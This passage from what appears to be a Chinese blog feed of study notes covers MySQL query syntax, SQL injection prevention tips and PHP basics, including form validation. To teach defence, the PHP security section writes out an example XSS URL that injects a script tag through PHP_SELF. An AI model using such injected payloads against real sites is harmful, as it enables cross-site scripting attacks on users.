<span class="keyword">BY</span> 列名称；</span><br><span class="line"><span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名称；</span><br></pre></td></tr></table></figure><ul><li>DISTINCT: 可选，删除结果集中重复的数据。默认情况下 UNION 操作符已经删除了重复数据，所以 DISTINCT 修饰符对结果没啥影响。</li><li>ALL: 可选，返回所有结果集，包含重复数据。</li></ul><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field1, field2,...fieldN <span class="keyword">FROM</span> table_name1, table_name2...</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> field1 [<span class="keyword">ASC</span> [<span class="keyword">DESC</span>][默认 <span class="keyword">ASC</span>]], [field2...] [<span class="keyword">ASC</span> [<span class="keyword">DESC</span>][默认 <span class="keyword">ASC</span>]]</span><br></pre></td></tr></table></figure><p>可以使用 <code>ASC</code> 或 <code>DESC</code>关键字来设置查询结果是按升序或降序排列。默认情况下，它是按升序排列。</p><h3 id="GROUP-BY-语句"><a href="#GROUP-BY-语句" class="headerlink" title="GROUP BY 语句"></a>GROUP BY 语句</h3><p>GROUP BY 语句根据一个或多个列对结果集进行分组。在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name, <span class="keyword">function</span>(column_name)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">operator</span> <span class="keyword">value</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> column_name;</span><br></pre></td></tr></table></figure><p>WITH ROLLUP 可以实现在分组统计数据基础上再进行相同的统计（SUM,AVG,COUNT…）。</p><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p><a href="https://www.runoob.com/regexp/regexp-metachar.html" target="_blank" rel="noopener">元字符参考链接</a></p><p>实例：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查找name字段中以'st'为开头的所有数据：</span><br><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP '^st';</span><br><span class="line"></span><br><span class="line">查找name字段中以'ok'为结尾的所有数据：</span><br><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP 'ok$';</span><br><span class="line"></span><br><span class="line">查找name字段中包含'mar'字符串的所有数据：</span><br><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP 'mar';</span><br><span class="line"></span><br><span class="line">查找name字段中以元音字符开头或以'ok'字符串结尾的所有数据：</span><br><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP '^[aeiou]|ok$';</span><br></pre></td></tr></table></figure><h3 id="正则表达式中-i-g-ig-gi-m的区别和含义"><a href="#正则表达式中-i-g-ig-gi-m的区别和含义" class="headerlink" title="正则表达式中/i,/g,/ig,/gi,/m的区别和含义"></a>正则表达式中/i,/g,/ig,/gi,/m的区别和含义</h3><p><a href="https://blog.csdn.net/yoland/java/article/details/5431453" target="_blank" rel="noopener">参考链接</a></p><ul><li><code>/i</code> (忽略大小写)</li><li><code>/g</code> (全文查找出现的所有匹配字符)</li><li><code>/m</code> (多行查找)</li><li><code>/gi</code>(全文查找、忽略大小写)</li><li><code>/ig</code>(全文查找、忽略大小写)</li></ul><h3 id="MySQL-及-SQL-注入"><a href="#MySQL-及-SQL-注入" class="headerlink" title="MySQL 及 SQL 注入"></a>MySQL 及 SQL 注入</h3><p>防止SQL注入，我们需要注意以下几个要点：</p><ol><li>永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和 双”-“进行转换等。</li><li>永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。</li><li>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li><li>不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。</li><li>应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装</li><li>sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。</li></ol><p>PHP的MySQL扩展提供了<code>mysqli_real_escape_string()</code>函数来转义特殊的输入字符。like查询时，如果用户输入的值有”_”和”%”，可以使用<code>addcslashes()</code>函数来处理。<code>addcslashes()</code>函数在指定的字符前添加反斜杠。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.runoob.com/mysql/mysql-tutorial.html" target="_blank" rel="noopener">runoob</a></p>]]></content>
      
      
      <categories>
          
          <category> Web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP入门笔记</title>
      <link href="/2020/04/22/PHP%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/04/22/PHP%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><ul><li><p>PHP 语句以分号结尾（;）。PHP 代码块的关闭标签也会自动表明分号（因此在 PHP 代码块的最后一行不必使用分号）。</p></li><li><p>在 PHP 中，所有用户定义的函数、类和关键词（例如 if、else、echo 等等）都对大小写不敏感；不过在 PHP 中，所有变量都对大小写敏感。</p></li></ul><a id="more"></a><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ul><li><p>PHP 变量规则：</p><ul><li><p>变量以 $ 符号开头，其后是变量的名称</p></li><li><p>变量名称对大小写敏感（$y 与 $Y 是两个不同的变量）</p></li></ul></li><li><p>PHP global 关键词用于在函数内访问全局变量。要做到这一点，请在（函数内部）变量前面使用 global 关键词.</p></li></ul><h3 id="echo-amp-print"><a href="#echo-amp-print" class="headerlink" title="echo &amp; print"></a>echo &amp; print</h3><p>echo 比 print 稍快，因为它不返回任何值，print始终返回1。</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li><p>字符串可以是引号内的任何文本，可以使用单引号或双引号。</p></li><li><p><code>var_dump()</code> 会返回变量的数据类型和值。</p></li><li><p>对象是存储数据和有关如何处理数据的信息的数据类型。在 PHP 中，必须明确地声明对象。首先我们必须声明对象的类。对此，我们使用 <code>class</code> 关键词。类是包含属性和方法的结构。然后我们在对象类中定义数据类型，然后在该类的实例中使用此数据类型。</p></li><li><p>特殊的 NULL 值表示变量无值。NULL 是数据类型 NULL 唯一可能的值。NULL 值标示变量是否为空。也用于区分空字符串与空值数据库。可以通过把值设置为 NULL，将变量清空。</p></li></ul><h3 id="PHP-字符串函数"><a href="#PHP-字符串函数" class="headerlink" title="PHP 字符串函数"></a>PHP 字符串函数</h3><ul><li><p><code>strlen()</code> 函数返回字符串的长度，以字符计。</p></li><li><p><code>str_word_count()</code> 函数对字符串中的单词进行计数。</p></li><li><p><code>strrev()</code> 函数反转字符串。</p></li><li><p><code>strpos()</code> 用于检索字符串内指定的字符或文本。如果找到匹配，则会返回首个匹配的字符位置。如果未找到匹配，则将返回 FALSE。注：<em>字符串中首字符的位置是 0 而不是 1</em>。</p></li><li><p><code>str_replace()</code> 用一些字符串替换字符串中的另一些字符。</p></li></ul><h3 id="设置-PHP-常量"><a href="#设置-PHP-常量" class="headerlink" title="设置 PHP 常量"></a>设置 PHP 常量</h3><p>如需设置常量，使用 <code>define()</code> 函数 - 它使用三个参数：</p><ol><li>首个参数定义常量的名称</li><li>第二个参数定义常量的值</li><li>可选的第三个参数规定常量名是否对大小写[<strong>不敏感</strong>]。默认是 false。</li></ol><p>常量是自动全局的，而且可以贯穿整个脚本使用。</p><h3 id="PHP-字符串运算符"><a href="#PHP-字符串运算符" class="headerlink" title="PHP 字符串运算符*"></a>PHP 字符串运算符*</h3><table><thead><tr><th>运算符</th><th>名称</th><th>例子</th><th>结果</th></tr></thead><tbody><tr><td>.</td><td>串接</td><td><code>$txt1 = &quot;Hello&quot; $txt2 = $txt1 . &quot; world!&quot;</code></td><td><code>$txt2</code> 包含 <code>&quot;Hello world!&quot;</code></td></tr><tr><td>.=</td><td>串接赋值</td><td><code>$txt1 = &quot;Hello&quot; $txt1 .= &quot; world!&quot;</code></td><td><code>$txt1</code> 包含 <code>&quot;Hello world!&quot;</code></td></tr></tbody></table><h3 id="PHP-比较运算符"><a href="#PHP-比较运算符" class="headerlink" title="PHP 比较运算符"></a>PHP 比较运算符</h3><ul><li><p><code>===</code>: 全等（完全相同），如果 $x 等于 $y，且它们类型相同，则返回 true。</p></li><li><p><code>!==</code>: 不全等（完全不同），如果 $x 不等于 $y，或它们类型不相同，则返回 true。</p></li><li><p><code>17==&#39;17&#39;, 17 !== &#39;17&#39;</code></p></li></ul><h3 id="PHP-foreach-循环"><a href="#PHP-foreach-循环" class="headerlink" title="PHP foreach 循环"></a>PHP foreach 循环</h3><p><code>foreach</code> 循环只适用于数组，并用于遍历数组中的每个键/值对。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($array <span class="keyword">as</span> $value) &#123;</span><br><span class="line">  code to be executed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$colors = <span class="keyword">array</span>(<span class="string">"red"</span>,<span class="string">"green"</span>,<span class="string">"blue"</span>,<span class="string">"yellow"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($colors <span class="keyword">as</span> $value) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"$value &lt;br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="PHP-数组"><a href="#PHP-数组" class="headerlink" title="PHP 数组"></a>PHP 数组</h3><p>在 PHP 中，有三种数组类型：</p><ul><li><strong>索引数组</strong> - 带有数字索引的数组。</li><li><strong>关联数组</strong> - 带有指定键的数组。</li><li><strong>多维数组</strong> - 包含一个或多个数组的数组。</li></ul><h3 id="索引数组"><a href="#索引数组" class="headerlink" title="索引数组"></a>索引数组</h3><p><code>count()</code> 函数用于返回数组的长度（元素数）。</p><h3 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h3><p>关联数组是使用您分配给数组的指定键的数组。有两种创建关联数组的方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$age=<span class="keyword">array</span>(<span class="string">"Bill"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Steve"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Elon"</span>=&gt;<span class="string">"43"</span>);</span><br><span class="line"></span><br><span class="line">$age[<span class="string">'Bill'</span>]=<span class="string">"63"</span>;</span><br><span class="line">$age[<span class="string">'Steve'</span>]=<span class="string">"56"</span>;</span><br><span class="line">$age[<span class="string">'Elon'</span>]=<span class="string">"47"</span>;</span><br></pre></td></tr></table></figure><p>遍历关联数组:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$age=<span class="keyword">array</span>(<span class="string">"Bill"</span>=&gt;<span class="string">"63"</span>,<span class="string">"Steve"</span>=&gt;<span class="string">"56"</span>,<span class="string">"Elon"</span>=&gt;<span class="string">"47"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($age <span class="keyword">as</span> $x=&gt;$x_value) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Key="</span> . $x . <span class="string">", Value="</span> . $x_value;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br></pre></td></tr></table></figure><h3 id="数组的排序函数"><a href="#数组的排序函数" class="headerlink" title="数组的排序函数"></a>数组的排序函数</h3><ul><li><code>sort()</code> - 以升序对数组排序</li><li><code>rsort()</code> - 以降序对数组排序</li><li><code>asort()</code> - 根据值，以升序对关联数组进行排序</li><li><code>ksort()</code> - 根据键，以升序对关联数组进行排序</li><li><code>arsort()</code> - 根据值，以降序对关联数组进行排序</li><li><code>krsort()</code> - 根据键，以降序对关联数组进行排序</li></ul><h3 id="PHP-全局变量-超全局变量"><a href="#PHP-全局变量-超全局变量" class="headerlink" title="PHP 全局变量 - 超全局变量"></a>PHP 全局变量 - 超全局变量</h3><p>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 <code>global $variable</code>; 就可以访问它们。</p><ul><li><code>$GLOBALS</code> : 用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。</li><li><code>$_SERVER</code> : 保存关于报头、路径和脚本位置的信息。</li><li><code>$_REQUEST</code> : 用于收集 HTML 表单提交的数据。</li><li><code>$_POST</code> : 广泛用于收集提交 method=”post” 的 HTML 表单后的表单数据。$_POST 也常用于传递变量。</li><li><code>$_GET</code> : 可用于收集提交 HTML 表单 (method=”get”) 之后的表单数据，也可以收集 URL 中的发送的数据。</li><li><code>$_FILES</code></li><li><code>$_ENV</code></li><li><code>$_COOKIE</code></li><li><code>$_SESSION</code></li></ul><h2 id="PHP-表单"><a href="#PHP-表单" class="headerlink" title="PHP 表单"></a>PHP 表单</h2><h3 id="PHP-表单处理"><a href="#PHP-表单处理" class="headerlink" title="PHP 表单处理"></a>PHP 表单处理</h3><p>PHP 超全局变量 $_GET 和 $_POST 用于收集表单数据（form-data）。</p><p>GET vs. POST：</p><ul><li><p>GET 和 POST 都创建数组（例如，array( key =&gt; value, key2 =&gt; value2, key3 =&gt; value3, …)）。此数组包含键/值对，其中的键是表单控件的名称，而值是来自用户的输入数据。</p></li><li><p>GET 和 POST 被视作 <code>$_GET</code> 和 <code>$_POST</code>。它们是超全局变量，这意味着对它们的访问无需考虑作用域 - 无需任何特殊代码，您能够从任何函数、类或文件访问它们。</p></li><li><p><code>$_GET</code> 是通过 URL 参数传递到当前脚本的变量数组。</p></li><li><p><code>$_POST</code> 是通过 HTTP POST 传递到当前脚本的变量数组。</p></li></ul><h4 id="何时使用-GET"><a href="#何时使用-GET" class="headerlink" title="何时使用 GET"></a>何时使用 GET</h4><ul><li>通过 GET 方法从表单发送的信息对任何人都是可见的（所有变量名和值都显示在 URL 中）。GET 对所发送信息的数量也有限制。限制在大约 2000 个字符。不过，<em>由于变量显示在 URL 中，把页面添加到书签中也更为方便。</em></li><li>ET 可用于发送非敏感的数据。</li></ul><p>注释：绝不能使用 GET 来发送密码或其他<font color=orangered>敏感信息</font>！</p><h4 id="何时使用-POST"><a href="#何时使用-POST" class="headerlink" title="何时使用 POST"></a>何时使用 POST</h4><ul><li><p>通过 POST 方法从表单发送的信息对其他人是不可见的（所有名称/值会被嵌入 HTTP 请求的主体中），并且对所发送信息的数量也无限制。</p></li><li><p>此外 POST 支持高阶功能，比如在向服务器上传文件时进行 multi-part 二进制输入。</p></li><li><p>不过，由于变量未显示在 URL 中，也就无法将页面添加到书签。</p></li></ul><p>提示：<em>开发者偏爱 POST 来发送表单数据</em>。</p><h3 id="PHP-表单验证"><a href="#PHP-表单验证" class="headerlink" title="PHP 表单验证"></a>PHP 表单验证</h3><p>在处理PHP表单时需要注意安全性。</p><h4 id="文本字段"><a href="#文本字段" class="headerlink" title="文本字段"></a>文本字段</h4><ul><li><p>文本输入元素：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>文本框</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">"comment"</span> <span class="attr">rows</span>=<span class="string">"5"</span> <span class="attr">cols</span>=<span class="string">"40"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h4>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">value</span>=<span class="string">"female"</span>&gt;</span>Female</span><br></pre></td></tr></table></figure><h3 id="表单元素"><a href="#表单元素" class="headerlink" title="表单元素"></a>表单元素</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"&lt;?php echo htmlspecialchars($_SERVER["</span><span class="attr">PHP_SELF</span>"]);?&gt;</span>"&gt;</span><br></pre></td></tr></table></figure><p>当提交此表单时，通过 method=”post” 发送表单数据。</p><ul><li><p><code>$_SERVER[&quot;PHP_SELF&quot;]</code>变量</p><p><code>$_SERVER[&quot;PHP_SELF&quot;]</code> 是一种超全局变量，它返回当前执行脚本的文件名。因此，<code>$_SERVER[&quot;PHP_SELF&quot;]</code>将表单数据发送到页面本身，而不是跳转到另一张页面。这样，用户就能够在表单页面获得错误提示信息。</p></li><li><p><code>htmlspecialchars()</code>函数</p><p><code>htmlspecialchars()</code>函数把特殊字符转换为 HTML 实体。这意味着 &lt; 和 &gt; 之类的 HTML 字符会被替换为 <code>&amp;lt;</code> 和 <code>&amp;gt;</code> 。这样可<font color=orangered>防止攻击者通过在表单中注入 HTML 或 JavaScript 代码（跨站点脚本攻击）对代码进行利用</font>。</p></li></ul><h3 id="关于-PHP-表单安全性的重要提示"><a href="#关于-PHP-表单安全性的重要提示" class="headerlink" title="关于 PHP 表单安全性的重要提示"></a>关于 PHP 表单安全性的重要提示</h3><p><code>$_SERVER[&quot;PHP_SELF&quot;]</code> 变量能够被黑客利用！如果您的页面使用了 <code>PHP_SELF</code>，用户能够输入下划线然后执行跨站点脚本（XSS）。</p><p>通过使用 <code>htmlspecialchars()</code> 函数能够避免 <code>$_SERVER[&quot;PHP_SELF&quot;]</code> 被利用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"&lt;?php echo htmlspecialchars($_SERVER["</span><span class="attr">PHP_SELF</span>"]);?&gt;</span>"&gt;</span><br></pre></td></tr></table></figure><p><code>htmlspecialchars()</code> 函数把特殊字符转换为 HTML 实体。</p><p>现在，如果用户试图利用 PHP_SELF 变量，会导致如下输出：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果用户在地址栏中键入了如下 URL：</span><br><span class="line">http://www.example.com/test_form.php/%22%3E%3Cscript%3Ealert('hacked')%3C/script%3E</span><br><span class="line">上面的代码会转换为：</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"test_form.php"</span>/&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'hacked'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">使用 `htmlspecialchars()` 函数:</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"test_form.php/<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert('hacked')<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>"</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="通过-PHP-验证表单数据"><a href="#通过-PHP-验证表单数据" class="headerlink" title="通过 PHP 验证表单数据"></a>通过 PHP 验证表单数据</h3><p>我们要做的第一件事是通过 PHP 的 <code>htmlspecialchars()</code> 函数传递所有变量。在用户提交该表单时，我们还要做两件事：</p><ol><li>（通过 PHP <code>trim()</code> 函数）去除用户输入数据中不必要的字符（多余的空格、制表符、换行）;</li><li>（通过 PHP <code>stripslashes()</code> 函数）删除用户输入数据中的反斜杠（\）;</li></ol><p>接下来我们创建一个检查函数（相比一遍遍地写代码，这样效率更好）:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$name = $email = $gender = $comment = $website = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">  $name = test_input($_POST[<span class="string">"name"</span>]);</span><br><span class="line">  $email = test_input($_POST[<span class="string">"email"</span>]);</span><br><span class="line">  $website = test_input($_POST[<span class="string">"website"</span>]);</span><br><span class="line">  $comment = test_input($_POST[<span class="string">"comment"</span>]);</span><br><span class="line">  $gender = test_input($_POST[<span class="string">"gender"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_input</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">  $data = trim($data);</span><br><span class="line">  $data = stripslashes($data);</span><br><span class="line">  $data = htmlspecialchars($data);</span><br><span class="line">  <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请注意在脚本开头，我们检查了表单是否使用 <code>$_SERVER[&quot;REQUEST_METHOD&quot;]</code> 进行提交。如果 REQUEST_METHOD 是 POST，那么表单已被提交 - 并且应该对其进行验证。如果未提交，则跳过验证并显示一个空白表单。</p><h3 id="PHP-表单验证-必填字段"><a href="#PHP-表单验证-必填字段" class="headerlink" title="PHP 表单验证 - 必填字段"></a>PHP 表单验证 - 必填字段</h3><p>通过 <code>empty()</code> 函数检查 <code>$_POST</code> 变量是否为空。如果为空，则错误消息会存储于不同的错误变量中。如果不为空，则通过 <code>test_input()</code> 函数发送用户输入数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义变量并设置为空值</span></span><br><span class="line">$nameErr = $emailErr = $genderErr = $websiteErr = <span class="string">""</span>;</span><br><span class="line">$name = $email = $gender = $comment = $website = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">"name"</span>])) &#123;</span><br><span class="line">    $nameErr = <span class="string">"Name is required"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $name = test_input($_POST[<span class="string">"name"</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 HTML 表单中，我们在每个被请求字段后面增加了一点脚本。如果需要，会生成恰当的错误消息（如果用户未填写必填字段就试图提交表单）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"&lt;?php echo htmlspecialchars($_SERVER["</span><span class="attr">PHP_SELF</span>"]);?&gt;</span>"&gt;</span><br><span class="line">  Name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error"</span>&gt;</span>* <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $nameErr;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  E-mail:</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error"</span>&gt;</span>* <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $emailErr;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  Website:</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"website"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error"</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $websiteErr;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>Comment: <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">"comment"</span> <span class="attr">rows</span>=<span class="string">"5"</span> <span class="attr">cols</span>=<span class="string">"40"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  Gender:</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">value</span>=<span class="string">"female"</span>&gt;</span>Female</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">value</span>=<span class="string">"male"</span>&gt;</span>Male</span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error"</span>&gt;</span>* <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $genderErr;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="PHP-表单验证-验证-E-mail-和-URL"><a 